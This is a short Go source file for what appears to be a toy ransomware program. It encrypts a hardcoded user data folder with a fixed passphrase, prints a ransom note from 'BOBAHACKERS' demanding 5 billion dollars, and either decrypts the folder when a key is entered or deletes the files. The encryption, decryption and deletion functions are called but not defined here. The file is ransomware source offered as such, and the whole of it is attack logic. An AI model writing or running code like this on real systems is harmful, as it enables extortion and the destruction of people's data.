package main

import (
	"fmt"
	"path/filepath"
)

func main() {
    passphrase := "thisisthesecretkeythatwillbeused"
    root := string(filepath.Separator) + "Users" + string(filepath.Separator) + "hangbui" + string(filepath.Separator) + "Documents" + string(filepath.Separator) + "data"
    
    encrypt(root, passphrase)
    printMessage()
    
	var option string
	fmt.Scanln(&option)

    if option == "1" {
		fmt.Print("Key: ")
		var key string
		fmt.Scanln(&key)
        decrypt(root, key)
    } else if option == "2" {
        deleteFiles(root)
    }
}

func printMessage() {
    fmt.Println()
    fmt.Println("YOUR DATA HAS BEEN ENCRYPTED BY BOBAHACKERS.")
    fmt.Println()
    fmt.Println("You have 2 options:")
	fmt.Println("1. Pay 5 BILLION dollars by 11pm on April 6, 2024 and we will send you the decryption key")
	fmt.Println("2. Refuse to pay and we will delete all your data")
    fmt.Println("---------------------------------------------------------")
	fmt.Print("Option (1 or 2): ")
}
